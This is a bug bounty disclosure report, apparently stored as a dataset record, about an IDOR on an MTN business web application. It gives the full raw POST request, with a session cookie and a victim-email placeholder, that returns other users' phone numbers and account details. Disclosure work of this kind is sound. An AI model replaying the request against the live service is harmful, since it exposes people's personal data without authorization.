title: IDOR at mtnmobad.mtnbusiness.com.ng leads to PII leakage.
content:
Summary:
Hello team, i found an IDOR at https://mtnmobad.mtnbusiness.com.ng/ that allows an attacker to enumerate data such as personal phone number and and account information justt from knowing the email.
The vulnerable request is the following:
Code 807 Bytes
1POST /app/getUserNotes HTTP/1.1
2Host: mtnmobad.mtnbusiness.com.ng
3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
4Accept: application/json, text/plain, */*
5Accept-Language: en-US,en;q=0.5
6Accept-Encoding: gzip, deflate
7Content-Type: application/json
8Content-Length: 195
9Origin: https://mtnmobad.mtnbusiness.com.ng
10Connection: close
11Referer: https://mtnmobad.mtnbusiness.com.ng/
12Cookie: G_ENABLED_IDPS=google; connect.sid=s%3ATYGgZ8wqgEinB9zX0d7-OdZyt2jXa_ev.hQw0FOvTD5bB159jCtqA%2BXv7z%2FHROL%2B2vSS6mNK%2FqVg
13Sec-Fetch-Dest: empty
14Sec-Fetch-Mode: cors
15Sec-Fetch-Site: same-origin
16
17{"params":{"updates":[{"param":"user","value":{"userEmail":"<PUT_VICTIM_EMAIL_HERE>"},"op":"a"}],"cloneFrom":{"updates":null,"cloneFrom":null,"encoder":{},"map":null},"encoder":{},"map":null}}
Simply replace the place holder <PUT_VICTIM_EMAIL_HERE> with the victim's email and you can see private data about his account such as phone number and account information, as you can see that's PII information being leaked.
Impact
PII leakage.
Send a POST request to https: //mtnmobad.mtnbusiness.com.ng/app/getUserNotes with the victim's email in the JSON payload.
vuln_description: An Insecure Direct Object Reference (IDOR) vulnerability at mtnmobad.mtnbusiness.com.ng allows an attacker to enumerate sensitive personal data (PII) such as phone numbers and account information by simply knowing the victim's email address.
reason: The vulnerability involves a straightforward manipulation of a single API endpoint with no complex interactions or state manipulations required. The attack is simple and relies on a common IDOR pattern where user input is directly used to fetch data without proper authorization checks.
